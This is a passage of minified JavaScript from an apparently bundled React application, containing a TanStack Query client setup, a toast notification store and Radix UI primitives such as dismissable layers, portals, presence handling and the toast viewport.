    return dl.isOnline() ? M(this, or).resumePausedMutations() : Promise.resolve()
  }
  getQueryCache() {
    return M(this, Ce)
  }
  getMutationCache() {
    return M(this, or)
  }
  getDefaultOptions() {
    return M(this, ir)
  }
  setDefaultOptions(e) {
    ne(this, ir, e)
  }
  setQueryDefaults(e, t) {
    M(this, zs).set(yi(e), {
      queryKey: e,
      defaultOptions: t
    })
  }
  getQueryDefaults(e) {
    const t = [...M(this, zs).values()];
    let n = {};
    return t.forEach(r => {
      vi(e, r.queryKey) && (n = {
        ...n,
        ...r.defaultOptions
      })
    }
    ),
      n
  }
  setMutationDefaults(e, t) {
    M(this, Us).set(yi(e), {
      mutationKey: e,
      defaultOptions: t
    })
  }
  getMutationDefaults(e) {
    const t = [...M(this, Us).values()];
    let n = {};
    return t.forEach(r => {
      vi(e, r.mutationKey) && (n = {
        ...n,
        ...r.defaultOptions
      })
    }
    ),
      n
  }
  defaultQueryOptions(e) {
    if (e._defaulted)
      return e;
    const t = {
      ...M(this, ir).queries,
      ...this.getQueryDefaults(e.queryKey),
      ...e,
      _defaulted: !0
    };
    return t.queryHash || (t.queryHash = _f(t.queryKey, t)),
      t.refetchOnReconnect === void 0 && (t.refetchOnReconnect = t.networkMode !== "always"),
      t.throwOnError === void 0 && (t.throwOnError = !!t.suspense),
      !t.networkMode && t.persister && (t.networkMode = "offlineFirst"),
      t.enabled !== !0 && t.queryFn === Lf && (t.enabled = !1),
      t
  }
  defaultMutationOptions(e) {
    return e != null && e._defaulted ? e : {
      ...M(this, ir).mutations,
      ...(e == null ? void 0 : e.mutationKey) && this.getMutationDefaults(e.mutationKey),
      ...e,
      _defaulted: !0
    }
  }
  clear() {
    M(this, Ce).clear(),
      M(this, or).clear()
  }
}
  ,
  Ce = new WeakMap,
  or = new WeakMap,
  ir = new WeakMap,
  zs = new WeakMap,
  Us = new WeakMap,
  ar = new WeakMap,
  $s = new WeakMap,
  Hs = new WeakMap,
  d0), YS = x.createContext(void 0), XS = ({ client: e, children: t }) => (x.useEffect(() => (e.mount(),
    () => {
      e.unmount()
    }
  ), [e]),
    a.jsx(YS.Provider, {
      value: e,
      children: t
    }));
const JS = new KS({
  defaultOptions: {
    queries: {
      queryFn: async ({ queryKey: e }) => {
        const t = await fetch(e[0], {
          credentials: "include"
        });
        if (!t.ok)
          throw t.status >= 500 ? new Error(`${t.status}: ${t.statusText}`) : new Error(`${t.status}: ${await t.text()}`);
        return t.json()
      }
      ,
      refetchInterval: !1,
      refetchOnWindowFocus: !1,
      staleTime: 1 / 0,
      retry: !1
    },
    mutations: {
      retry: !1
    }
  }
})
  , ZS = 1
  , eC = 1e6;
let Wc = 0;
function tC() {
  return Wc = (Wc + 1) % Number.MAX_SAFE_INTEGER,
    Wc.toString()
}
const Qc = new Map
  , tp = e => {
    if (Qc.has(e))
      return;
    const t = setTimeout(() => {
      Qc.delete(e),
        Go({
          type: "REMOVE_TOAST",
          toastId: e
        })
    }
      , eC);
    Qc.set(e, t)
  }
  , nC = (e, t) => {
    switch (t.type) {
      case "ADD_TOAST":
        return {
          ...e,
          toasts: [t.toast, ...e.toasts].slice(0, ZS)
        };
      case "UPDATE_TOAST":
        return {
          ...e,
          toasts: e.toasts.map(n => n.id === t.toast.id ? {
            ...n,
            ...t.toast
          } : n)
        };
      case "DISMISS_TOAST":
        {
          const { toastId: n } = t;
          return n ? tp(n) : e.toasts.forEach(r => {
            tp(r.id)
          }
          ),
          {
            ...e,
            toasts: e.toasts.map(r => r.id === n || n === void 0 ? {
              ...r,
              open: !1
            } : r)
          }
        }
      case "REMOVE_TOAST":
        return t.toastId === void 0 ? {
          ...e,
          toasts: []
        } : {
          ...e,
          toasts: e.toasts.filter(n => n.id !== t.toastId)
        }
    }
  }
  , Oa = [];
let Ia = {
  toasts: []
};
function Go(e) {
  Ia = nC(Ia, e),
    Oa.forEach(t => {
      t(Ia)
    }
    )
}
function rC({ ...e }) {
  const t = tC()
    , n = s => Go({
      type: "UPDATE_TOAST",
      toast: {
        ...s,
        id: t
      }
    })
    , r = () => Go({
      type: "DISMISS_TOAST",
      toastId: t
    });
  return Go({
    type: "ADD_TOAST",
    toast: {
      ...e,
      id: t,
      open: !0,
      onOpenChange: s => {
        s || r()
      }
    }
  }),
  {
    id: t,
    dismiss: r,
    update: n
  }
}
function sC() {
  const [e, t] = x.useState(Ia);
  return x.useEffect(() => (Oa.push(t),
    () => {
      const n = Oa.indexOf(t);
      n > -1 && Oa.splice(n, 1)
    }
  ), [e]),
  {
    ...e,
    toast: rC,
    dismiss: n => Go({
      type: "DISMISS_TOAST",
      toastId: n
    })
  }
}
function bt(e, t, { checkForDefaultPrevented: n = !0 } = {}) {
  return function (s) {
    if (e == null || e(s),
      n === !1 || !s.defaultPrevented)
      return t == null ? void 0 : t(s)
  }
}
function oC(e, t) {
  typeof e == "function" ? e(t) : e != null && (e.current = t)
}
function Rv(...e) {
  return t => e.forEach(n => oC(n, t))
}
function Zr(...e) {
  return x.useCallback(Rv(...e), e)
}
function iC(e, t = []) {
  let n = [];
  function r(o, i) {
    const l = x.createContext(i)
      , c = n.length;
    n = [...n, i];
    function u(f) {
      const { scope: h, children: y, ...b } = f
        , v = (h == null ? void 0 : h[e][c]) || l
        , C = x.useMemo(() => b, Object.values(b));
      return a.jsx(v.Provider, {
        value: C,
        children: y
      })
    }
    function d(f, h) {
      const y = (h == null ? void 0 : h[e][c]) || l
        , b = x.useContext(y);
      if (b)
        return b;
      if (i !== void 0)
        return i;
      throw new Error(`\`${f}\` must be used within \`${o}\``)
    }
    return u.displayName = o + "Provider",
      [u, d]
  }
  const s = () => {
    const o = n.map(i => x.createContext(i));
    return function (l) {
      const c = (l == null ? void 0 : l[e]) || o;
      return x.useMemo(() => ({
        [`__scope${e}`]: {
          ...l,
          [e]: c
        }
      }), [l, c])
    }
  }
    ;
  return s.scopeName = e,
    [r, aC(s, ...t)]
}
function aC(...e) {
  const t = e[0];
  if (e.length === 1)
    return t;
  const n = () => {
    const r = e.map(s => ({
      useScope: s(),
      scopeName: s.scopeName
    }));
    return function (o) {
      const i = r.reduce((l, { useScope: c, scopeName: u }) => {
        const f = c(o)[`__scope${u}`];
        return {
          ...l,
          ...f
        }
      }
        , {});
      return x.useMemo(() => ({
        [`__scope${t.scopeName}`]: i
      }), [i])
    }
  }
    ;
  return n.scopeName = t.scopeName,
    n
}
var xi = x.forwardRef((e, t) => {
  const { children: n, ...r } = e
    , s = x.Children.toArray(n)
    , o = s.find(cC);
  if (o) {
    const i = o.props.children
      , l = s.map(c => c === o ? x.Children.count(i) > 1 ? x.Children.only(null) : x.isValidElement(i) ? i.props.children : null : c);
    return a.jsx(hd, {
      ...r,
      ref: t,
      children: x.isValidElement(i) ? x.cloneElement(i, void 0, l) : null
    })
  }
  return a.jsx(hd, {
    ...r,
    ref: t,
    children: n
  })
}
);
xi.displayName = "Slot";
var hd = x.forwardRef((e, t) => {
  const { children: n, ...r } = e;
  if (x.isValidElement(n)) {
    const s = dC(n);
    return x.cloneElement(n, {
      ...uC(r, n.props),
      ref: t ? Rv(t, s) : s
    })
  }
  return x.Children.count(n) > 1 ? x.Children.only(null) : null
}
);
hd.displayName = "SlotClone";
var lC = ({ children: e }) => a.jsx(a.Fragment, {
  children: e
});
function cC(e) {
  return x.isValidElement(e) && e.type === lC
}
function uC(e, t) {
  const n = {
    ...t
  };
  for (const r in t) {
    const s = e[r]
      , o = t[r];
    /^on[A-Z]/.test(r) ? s && o ? n[r] = (...l) => {
      o(...l),
        s(...l)
    }
      : s && (n[r] = s) : r === "style" ? n[r] = {
        ...s,
        ...o
      } : r === "className" && (n[r] = [s, o].filter(Boolean).join(" "))
  }
  return {
    ...e,
    ...n
  }
}
function dC(e) {
  var r, s;
  let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get
    , n = t && "isReactWarning" in t && t.isReactWarning;
  return n ? e.ref : (t = (s = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : s.get,
    n = t && "isReactWarning" in t && t.isReactWarning,
    n ? e.props.ref : e.props.ref || e.ref)
}
function fC(e) {
  const t = e + "CollectionProvider"
    , [n, r] = iC(t)
    , [s, o] = n(t, {
      collectionRef: {
        current: null
      },
      itemMap: new Map
    })
    , i = y => {
      const { scope: b, children: v } = y
        , C = ue.useRef(null)
        , g = ue.useRef(new Map).current;
      return a.jsx(s, {
        scope: b,
        itemMap: g,
        collectionRef: C,
        children: v
      })
    }
    ;
  i.displayName = t;
  const l = e + "CollectionSlot"
    , c = ue.forwardRef((y, b) => {
      const { scope: v, children: C } = y
        , g = o(l, v)
        , m = Zr(b, g.collectionRef);
      return a.jsx(xi, {
        ref: m,
        children: C
      })
    }
    );
  c.displayName = l;
  const u = e + "CollectionItemSlot"
    , d = "data-radix-collection-item"
    , f = ue.forwardRef((y, b) => {
      const { scope: v, children: C, ...g } = y
        , m = ue.useRef(null)
        , p = Zr(b, m)
        , w = o(u, v);
      return ue.useEffect(() => (w.itemMap.set(m, {
        ref: m,
        ...g
      }),
        () => void w.itemMap.delete(m))),
        a.jsx(xi, {
          [d]: "",
          ref: p,
          children: C
        })
    }
    );
  f.displayName = u;
  function h(y) {
    const b = o(e + "CollectionConsumer", y);
    return ue.useCallback(() => {
      const C = b.collectionRef.current;
      if (!C)
        return [];
      const g = Array.from(C.querySelectorAll(`[${d}]`));
      return Array.from(b.itemMap.values()).sort((w, S) => g.indexOf(w.ref.current) - g.indexOf(S.ref.current))
    }
      , [b.collectionRef, b.itemMap])
  }
  return [{
    Provider: i,
    Slot: c,
    ItemSlot: f
  }, h, r]
}
function hC(e, t = []) {
  let n = [];
  function r(o, i) {
    const l = x.createContext(i)
      , c = n.length;
    n = [...n, i];
    const u = f => {
      var g;
      const { scope: h, children: y, ...b } = f
        , v = ((g = h == null ? void 0 : h[e]) == null ? void 0 : g[c]) || l
        , C = x.useMemo(() => b, Object.values(b));
      return a.jsx(v.Provider, {
        value: C,
        children: y
      })
    }
      ;
    u.displayName = o + "Provider";
    function d(f, h) {
      var v;
      const y = ((v = h == null ? void 0 : h[e]) == null ? void 0 : v[c]) || l
        , b = x.useContext(y);
      if (b)
        return b;
      if (i !== void 0)
        return i;
      throw new Error(`\`${f}\` must be used within \`${o}\``)
    }
    return [u, d]
  }
  const s = () => {
    const o = n.map(i => x.createContext(i));
    return function (l) {
      const c = (l == null ? void 0 : l[e]) || o;
      return x.useMemo(() => ({
        [`__scope${e}`]: {
          ...l,
          [e]: c
        }
      }), [l, c])
    }
  }
    ;
  return s.scopeName = e,
    [r, mC(s, ...t)]
}
function mC(...e) {
  const t = e[0];
  if (e.length === 1)
    return t;
  const n = () => {
    const r = e.map(s => ({
      useScope: s(),
      scopeName: s.scopeName
    }));
    return function (o) {
      const i = r.reduce((l, { useScope: c, scopeName: u }) => {
        const f = c(o)[`__scope${u}`];
        return {
          ...l,
          ...f
        }
      }
        , {});
      return x.useMemo(() => ({
        [`__scope${t.scopeName}`]: i
      }), [i])
    }
  }
    ;
  return n.scopeName = t.scopeName,
    n
}
var pC = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"]
  , yn = pC.reduce((e, t) => {
    const n = x.forwardRef((r, s) => {
      const { asChild: o, ...i } = r
        , l = o ? xi : t;
      return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0),
        a.jsx(l, {
          ...i,
          ref: s
        })
    }
    );
    return n.displayName = `Primitive.${t}`,
    {
      ...e,
      [t]: n
    }
  }
    , {});
function Ov(e, t) {
  e && Hl.flushSync(() => e.dispatchEvent(t))
}
function Vn(e) {
  const t = x.useRef(e);
  return x.useEffect(() => {
    t.current = e
  }
  ),
    x.useMemo(() => (...n) => {
      var r;
      return (r = t.current) == null ? void 0 : r.call(t, ...n)
    }
      , [])
}
function gC(e, t = globalThis == null ? void 0 : globalThis.document) {
  const n = Vn(e);
  x.useEffect(() => {
    const r = s => {
      s.key === "Escape" && n(s)
    }
      ;
    return t.addEventListener("keydown", r, {
      capture: !0
    }),
      () => t.removeEventListener("keydown", r, {
        capture: !0
      })
  }
    , [n, t])
}
var yC = "DismissableLayer", md = "dismissableLayer.update", vC = "dismissableLayer.pointerDownOutside", xC = "dismissableLayer.focusOutside", np, Iv = x.createContext({
  layers: new Set,
  layersWithOutsidePointerEventsDisabled: new Set,
  branches: new Set
}), _v = x.forwardRef((e, t) => {
  const { disableOutsidePointerEvents: n = !1, onEscapeKeyDown: r, onPointerDownOutside: s, onFocusOutside: o, onInteractOutside: i, onDismiss: l, ...c } = e
    , u = x.useContext(Iv)
    , [d, f] = x.useState(null)
    , h = (d == null ? void 0 : d.ownerDocument) ?? (globalThis == null ? void 0 : globalThis.document)
    , [, y] = x.useState({})
    , b = Zr(t, P => f(P))
    , v = Array.from(u.layers)
    , [C] = [...u.layersWithOutsidePointerEventsDisabled].slice(-1)
    , g = v.indexOf(C)
    , m = d ? v.indexOf(d) : -1
    , p = u.layersWithOutsidePointerEventsDisabled.size > 0
    , w = m >= g
    , S = bC(P => {
      const A = P.target
        , k = [...u.branches].some(D => D.contains(A));
      !w || k || (s == null || s(P),
        i == null || i(P),
        P.defaultPrevented || l == null || l())
    }
      , h)
    , N = SC(P => {
      const A = P.target;
      [...u.branches].some(D => D.contains(A)) || (o == null || o(P),
        i == null || i(P),
        P.defaultPrevented || l == null || l())
    }
      , h);
  return gC(P => {
    m === u.layers.size - 1 && (r == null || r(P),
      !P.defaultPrevented && l && (P.preventDefault(),
        l()))
  }
    , h),
    x.useEffect(() => {
      if (d)
        return n && (u.layersWithOutsidePointerEventsDisabled.size === 0 && (np = h.body.style.pointerEvents,
          h.body.style.pointerEvents = "none"),
          u.layersWithOutsidePointerEventsDisabled.add(d)),
          u.layers.add(d),
          rp(),
          () => {
            n && u.layersWithOutsidePointerEventsDisabled.size === 1 && (h.body.style.pointerEvents = np)
          }
    }
      , [d, h, n, u]),
    x.useEffect(() => () => {
      d && (u.layers.delete(d),
        u.layersWithOutsidePointerEventsDisabled.delete(d),
        rp())
    }
      , [d, u]),
    x.useEffect(() => {
      const P = () => y({});
      return document.addEventListener(md, P),
        () => document.removeEventListener(md, P)
    }
      , []),
    a.jsx(yn.div, {
      ...c,
      ref: b,
      style: {
        pointerEvents: p ? w ? "auto" : "none" : void 0,
        ...e.style
      },
      onFocusCapture: bt(e.onFocusCapture, N.onFocusCapture),
      onBlurCapture: bt(e.onBlurCapture, N.onBlurCapture),
      onPointerDownCapture: bt(e.onPointerDownCapture, S.onPointerDownCapture)
    })
}
);
_v.displayName = yC;
var wC = "DismissableLayerBranch"
  , Lv = x.forwardRef((e, t) => {
    const n = x.useContext(Iv)
      , r = x.useRef(null)
      , s = Zr(t, r);
    return x.useEffect(() => {
      const o = r.current;
      if (o)
        return n.branches.add(o),
          () => {
            n.branches.delete(o)
          }
    }
      , [n.branches]),
      a.jsx(yn.div, {
        ...e,
        ref: s
      })
  }
  );
Lv.displayName = wC;
function bC(e, t = globalThis == null ? void 0 : globalThis.document) {
  const n = Vn(e)
    , r = x.useRef(!1)
    , s = x.useRef(() => { }
    );
  return x.useEffect(() => {
    const o = l => {
      if (l.target && !r.current) {
        let c = function () {
          Fv(vC, n, u, {
            discrete: !0
          })
        };
        const u = {
          originalEvent: l
        };
        l.pointerType === "touch" ? (t.removeEventListener("click", s.current),
          s.current = c,
          t.addEventListener("click", s.current, {
            once: !0
          })) : c()
      } else
        t.removeEventListener("click", s.current);
      r.current = !1
    }
      , i = window.setTimeout(() => {
        t.addEventListener("pointerdown", o)
      }
        , 0);
    return () => {
      window.clearTimeout(i),
        t.removeEventListener("pointerdown", o),
        t.removeEventListener("click", s.current)
    }
  }
    , [t, n]),
  {
    onPointerDownCapture: () => r.current = !0
  }
}
function SC(e, t = globalThis == null ? void 0 : globalThis.document) {
  const n = Vn(e)
    , r = x.useRef(!1);
  return x.useEffect(() => {
    const s = o => {
      o.target && !r.current && Fv(xC, n, {
        originalEvent: o
      }, {
        discrete: !1
      })
    }
      ;
    return t.addEventListener("focusin", s),
      () => t.removeEventListener("focusin", s)
  }
    , [t, n]),
  {
    onFocusCapture: () => r.current = !0,
    onBlurCapture: () => r.current = !1
  }
}
function rp() {
  const e = new CustomEvent(md);
  document.dispatchEvent(e)
}
function Fv(e, t, n, { discrete: r }) {
  const s = n.originalEvent.target
    , o = new CustomEvent(e, {
      bubbles: !1,
      cancelable: !0,
      detail: n
    });
  t && s.addEventListener(e, t, {
    once: !0
  }),
    r ? Ov(s, o) : s.dispatchEvent(o)
}
var CC = _v
  , NC = Lv
  , fl = globalThis != null && globalThis.document ? x.useLayoutEffect : () => { }
  , jC = "Portal"
  , Vv = x.forwardRef((e, t) => {
    var l;
    const { container: n, ...r } = e
      , [s, o] = x.useState(!1);
    fl(() => o(!0), []);
    const i = n || s && ((l = globalThis == null ? void 0 : globalThis.document) == null ? void 0 : l.body);
    return i ? AS.createPortal(a.jsx(yn.div, {
      ...r,
      ref: t
    }), i) : null
  }
  );
Vv.displayName = jC;
function PC(e, t) {
  return x.useReducer((n, r) => t[n][r] ?? n, e)
}
var Bv = e => {
  const { present: t, children: n } = e
    , r = AC(t)
    , s = typeof n == "function" ? n({
      present: r.isPresent
    }) : x.Children.only(n)
    , o = Zr(r.ref, EC(s));
  return typeof n == "function" || r.isPresent ? x.cloneElement(s, {
    ref: o
  }) : null
}
  ;
Bv.displayName = "Presence";
function AC(e) {
  const [t, n] = x.useState()
    , r = x.useRef({})
    , s = x.useRef(e)
    , o = x.useRef("none")
    , i = e ? "mounted" : "unmounted"
    , [l, c] = PC(i, {
      mounted: {
        UNMOUNT: "unmounted",
        ANIMATION_OUT: "unmountSuspended"
      },
      unmountSuspended: {
        MOUNT: "mounted",
        ANIMATION_END: "unmounted"
      },
      unmounted: {
        MOUNT: "mounted"
      }
    });
  return x.useEffect(() => {
    const u = ma(r.current);
    o.current = l === "mounted" ? u : "none"
  }
    , [l]),
    fl(() => {
      const u = r.current
        , d = s.current;
      if (d !== e) {
        const h = o.current
          , y = ma(u);
        e ? c("MOUNT") : y === "none" || (u == null ? void 0 : u.display) === "none" ? c("UNMOUNT") : c(d && h !== y ? "ANIMATION_OUT" : "UNMOUNT"),
          s.current = e
      }
    }
      , [e, c]),
    fl(() => {
      if (t) {
        let u;
        const d = t.ownerDocument.defaultView ?? window
          , f = y => {
            const v = ma(r.current).includes(y.animationName);
            if (y.target === t && v && (c("ANIMATION_END"),
              !s.current)) {
              const C = t.style.animationFillMode;
              t.style.animationFillMode = "forwards",
                u = d.setTimeout(() => {
                  t.style.animationFillMode === "forwards" && (t.style.animationFillMode = C)
                }
                )
            }
          }
          , h = y => {
            y.target === t && (o.current = ma(r.current))
          }
          ;
        return t.addEventListener("animationstart", h),
          t.addEventListener("animationcancel", f),
          t.addEventListener("animationend", f),
          () => {
            d.clearTimeout(u),
              t.removeEventListener("animationstart", h),
              t.removeEventListener("animationcancel", f),
              t.removeEventListener("animationend", f)
          }
      } else
        c("ANIMATION_END")
    }
      , [t, c]),
  {
    isPresent: ["mounted", "unmountSuspended"].includes(l),
    ref: x.useCallback(u => {
      u && (r.current = getComputedStyle(u)),
        n(u)
    }
      , [])
  }
}
function ma(e) {
  return (e == null ? void 0 : e.animationName) || "none"
}
function EC(e) {
  var r, s;
  let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get
    , n = t && "isReactWarning" in t && t.isReactWarning;
  return n ? e.ref : (t = (s = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : s.get,
    n = t && "isReactWarning" in t && t.isReactWarning,
    n ? e.props.ref : e.props.ref || e.ref)
}
function TC({ prop: e, defaultProp: t, onChange: n = () => { }
}) {
  const [r, s] = kC({
    defaultProp: t,
    onChange: n
  })
    , o = e !== void 0
    , i = o ? e : r
    , l = Vn(n)
    , c = x.useCallback(u => {
      if (o) {
        const f = typeof u == "function" ? u(e) : u;
        f !== e && l(f)
      } else
        s(u)
    }
      , [o, e, s, l]);
  return [i, c]
}
function kC({ defaultProp: e, onChange: t }) {
  const n = x.useState(e)
    , [r] = n
    , s = x.useRef(r)
    , o = Vn(t);
  return x.useEffect(() => {
    s.current !== r && (o(r),
      s.current = r)
  }
    , [r, s, o]),
    n
}
var DC = "VisuallyHidden"
  , Ff = x.forwardRef((e, t) => a.jsx(yn.span, {
    ...e,
    ref: t,
    style: {
      position: "absolute",
      border: 0,
      width: 1,
      height: 1,
      padding: 0,
      margin: -1,
      overflow: "hidden",
      clip: "rect(0, 0, 0, 0)",
      whiteSpace: "nowrap",
      wordWrap: "normal",
      ...e.style
    }
  }));
Ff.displayName = DC;
var Vf = "ToastProvider"
  , [Bf, MC, RC] = fC("Toast")
  , [zv, T5] = hC("Toast", [RC])
  , [OC, ql] = zv(Vf)
  , Uv = e => {
    const { __scopeToast: t, label: n = "Notification", duration: r = 5e3, swipeDirection: s = "right", swipeThreshold: o = 50, children: i } = e
      , [l, c] = x.useState(null)
      , [u, d] = x.useState(0)
      , f = x.useRef(!1)
      , h = x.useRef(!1);
    return n.trim() || console.error(`Invalid prop \`label\` supplied to \`${Vf}\`. Expected non-empty \`string\`.`),
      a.jsx(Bf.Provider, {
        scope: t,
        children: a.jsx(OC, {
          scope: t,
          label: n,
          duration: r,
          swipeDirection: s,
          swipeThreshold: o,
          toastCount: u,
          viewport: l,
          onViewportChange: c,
          onToastAdd: x.useCallback(() => d(y => y + 1), []),
          onToastRemove: x.useCallback(() => d(y => y - 1), []),
          isFocusedToastEscapeKeyDownRef: f,
          isClosePausedRef: h,
          children: i
        })
      })
  }
  ;
Uv.displayName = Vf;
var $v = "ToastViewport"
  , IC = ["F8"]
  , pd = "toast.viewportPause"
  , gd = "toast.viewportResume"
  , Hv = x.forwardRef((e, t) => {
    const { __scopeToast: n, hotkey: r = IC, label: s = "Notifications ({hotkey})", ...o } = e
      , i = ql($v, n)
      , l = MC(n)
      , c = x.useRef(null)
      , u = x.useRef(null)
      , d = x.useRef(null)
      , f = x.useRef(null)
      , h = Zr(t, f, i.onViewportChange)
      , y = r.join("+").replace(/Key/g, "").replace(/Digit/g, "")
      , b = i.toastCount > 0;
    x.useEffect(() => {
      const C = g => {
        var p;
        r.length !== 0 && r.every(w => g[w] || g.code === w) && ((p = f.current) == null || p.focus())
      }
        ;
      return document.addEventListener("keydown", C),
        () => document.removeEventListener("keydown", C)
    }
      , [r]),
      x.useEffect(() => {
        const C = c.current
          , g = f.current;
        if (b && C && g) {
          const m = () => {
            if (!i.isClosePausedRef.current) {
              const N = new CustomEvent(pd);
              g.dispatchEvent(N),
                i.isClosePausedRef.current = !0
            }
          }
            , p = () => {
              if (i.isClosePausedRef.current) {
                const N = new CustomEvent(gd);
                g.dispatchEvent(N),
                  i.isClosePausedRef.current = !1
              }
            }
            , w = N => {
              !C.contains(N.relatedTarget) && p()
            }
            , S = () => {
              C.contains(document.activeElement) || p()
            }
            ;
          return C.addEventListener("focusin", m),
            C.addEventListener("focusout", w),
            C.addEventListener("pointermove", m),
            C.addEventListener("pointerleave", S),
            window.addEventListener("blur", m),
            window.addEventListener("focus", p),
            () => {
              C.removeEventListener("focusin", m),
                C.removeEventListener("focusout", w),
                C.removeEventListener("pointermove", m),
                C.removeEventListener("pointerleave", S),
                window.removeEventListener("blur", m),
                window.removeEventListener("focus", p)
            }
        }
      }
        , [b, i.isClosePausedRef]);
    const v = x.useCallback(({ tabbingDirection: C }) => {
      const m = l().map(p => {
        const w = p.ref.current
          , S = [w, ...GC(w)];
        return C === "forwards" ? S : S.reverse()
      }
      );
      return (C === "forwards" ? m.reverse() : m).flat()
    }
      , [l]);
    return x.useEffect(() => {
      const C = f.current;
      if (C) {
        const g = m => {
          var S, N, P;
          const p = m.altKey || m.ctrlKey || m.metaKey;
          if (m.key === "Tab" && !p) {
            const A = document.activeElement
              , k = m.shiftKey;
            if (m.target === C && k) {
              (S = u.current) == null || S.focus();
              return
            }
            const I = v({
              tabbingDirection: k ? "backwards" : "forwards"
            })
              , H = I.findIndex(z => z === A);
            qc(I.slice(H + 1)) ? m.preventDefault() : k ? (N = u.current) == null || N.focus() : (P = d.current) == null || P.focus()
          }
        }
          ;
        return C.addEventListener("keydown", g),
          () => C.removeEventListener("keydown", g)
      }
    }
      , [l, v]),
      a.jsxs(NC, {
        ref: c,
        role: "region",
        "aria-label": s.replace("{hotkey}", y),
        tabIndex: -1,
        style: {
          pointerEvents: b ? void 0 : "none"
        },
        children: [b && a.jsx(yd, {
          ref: u,
          onFocusFromOutsideViewport: () => {
            const C = v({
              tabbingDirection: "forwards"
            });
            qc(C)
          }
        }), a.jsx(Bf.Slot, {
          scope: n,
          children: a.jsx(yn.ol, {
            tabIndex: -1,
            ...o,
            ref: h
          })
        }), b && a.jsx(yd, {
          ref: d,
          onFocusFromOutsideViewport: () => {
            const C = v({
              tabbingDirection: "backwards"
            });
            qc(C)
          }
        })]
      })
  }
  );
Hv.displayName = $v;
var Wv = "ToastFocusProxy"
  , yd = x.forwardRef((e, t) => {
    const { __scopeToast: n, onFocusFromOutsideViewport: r, ...s } = e
      , o = ql(Wv, n);
    return a.jsx(Ff, {
      "aria-hidden": !0,
      tabIndex: 0,
      ...s,
      ref: t,
      style: {
        position: "fixed"
      },
      onFocus: i => {
        var u;
        const l = i.relatedTarget;
        !((u = o.viewport) != null && u.contains(l)) && r()
      }
    })
  }
  );
yd.displayName = Wv;
var Gl = "Toast"
  , _C = "toast.swipeStart"
  , LC = "toast.swipeMove"
  , FC = "toast.swipeCancel"
  , VC = "toast.swipeEnd"
  , Qv = x.forwardRef((e, t) => {
    const { forceMount: n, open: r, defaultOpen: s, onOpenChange: o, ...i } = e
      , [l = !0, c] = TC({
        prop: r,
        defaultProp: s,
        onChange: o
      });
    return a.jsx(Bv, {
      present: n || l,
      children: a.jsx(UC, {
        open: l,
        ...i,
        ref: t,
        onClose: () => c(!1),
        onPause: Vn(e.onPause),
        onResume: Vn(e.onResume),
        onSwipeStart: bt(e.onSwipeStart, u => {
          u.currentTarget.setAttribute("data-swipe", "start")
        }
        ),
        onSwipeMove: bt(e.onSwipeMove, u => {
          const { x: d, y: f } = u.detail.delta;
          u.currentTarget.setAttribute("data-swipe", "move"),
            u.currentTarget.style.setProperty("--radix-toast-swipe-move-x", `${d}px`),
            u.currentTarget.style.setProperty("--radix-toast-swipe-move-y", `${f}px`)
        }
        ),
        onSwipeCancel: bt(e.onSwipeCancel, u => {
          u.currentTarget.setAttribute("data-swipe", "cancel"),
            u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
            u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
            u.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),
            u.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")
        }
        ),
        onSwipeEnd: bt(e.onSwipeEnd, u => {
          const { x: d, y: f } = u.detail.delta;
          u.currentTarget.setAttribute("data-swipe", "end"),
            u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
            u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
            u.currentTarget.style.setProperty("--radix-toast-swipe-end-x", `${d}px`),
            u.currentTarget.style.setProperty("--radix-toast-swipe-end-y", `${f}px`),
            c(!1)
        }
        )
      })
    })
  }
  );
Qv.displayName = Gl;
var [BC, zC] = zv(Gl, {
  onClose() { }
})
  , UC = x.forwardRef((e, t) => {
    const { __scopeToast: n, type: r = "foreground", duration: s, open: o, onClose: i, onEscapeKeyDown: l, onPause: c, onResume: u, onSwipeStart: d, onSwipeMove: f, onSwipeCancel: h, onSwipeEnd: y, ...b } = e
      , v = ql(Gl, n)
      , [C, g] = x.useState(null)
      , m = Zr(t, z => g(z))
      , p = x.useRef(null)
      , w = x.useRef(null)
      , S = s || v.duration
      , N = x.useRef(0)
      , P = x.useRef(S)
      , A = x.useRef(0)
      , { onToastAdd: k, onToastRemove: D } = v
      , q = Vn(() => {
        var te;
        (C == null ? void 0 : C.contains(document.activeElement)) && ((te = v.viewport) == null || te.focus()),
          i()
      }
      )
      , I = x.useCallback(z => {
        !z || z === 1 / 0 || (window.clearTimeout(A.current),
          N.current = new Date().getTime(),
          A.current = window.setTimeout(q, z))
      }
        , [q]);
    x.useEffect(() => {
      const z = v.viewport;
      if (z) {
        const te = () => {
          I(P.current),
            u == null || u()
        }
          , se = () => {
            const X = new Date().getTime() - N.current;
            P.current = P.current - X,
              window.clearTimeout(A.current),
              c == null || c()
          }
          ;
        return z.addEventListener(pd, se),
          z.addEventListener(gd, te),
          () => {
            z.removeEventListener(pd, se),
              z.removeEventListener(gd, te)
          }
      }
    }
      , [v.viewport, S, c, u, I]),
      x.useEffect(() => {
        o && !v.isClosePausedRef.current && I(S)
      }
        , [o, S, v.isClosePausedRef, I]),
      x.useEffect(() => (k(),
        () => D()), [k, D]);
    const H = x.useMemo(() => C ? Zv(C) : null, [C]);
    return v.viewport ? a.jsxs(a.Fragment, {
      children: [H && a.jsx($C, {
        __scopeToast: n,
        role: "status",
        "aria-live": r === "foreground" ? "assertive" : "polite",
        "aria-atomic": !0,
        children: H
      }), a.jsx(BC, {
        scope: n,
        onClose: q,
        children: Hl.createPortal(a.jsx(Bf.ItemSlot, {
          scope: n,
          children: a.jsx(CC, {
            asChild: !0,
            onEscapeKeyDown: bt(l, () => {
              v.isFocusedToastEscapeKeyDownRef.current || q(),
                v.isFocusedToastEscapeKeyDownRef.current = !1
            }
            ),
            children: a.jsx(yn.li, {
              role: "status",
              "aria-live": "off",
              "aria-atomic": !0,
              tabIndex: 0,
              "data-state": o ? "open" : "closed",
              "data-swipe-direction": v.swipeDirection,
              ...b,
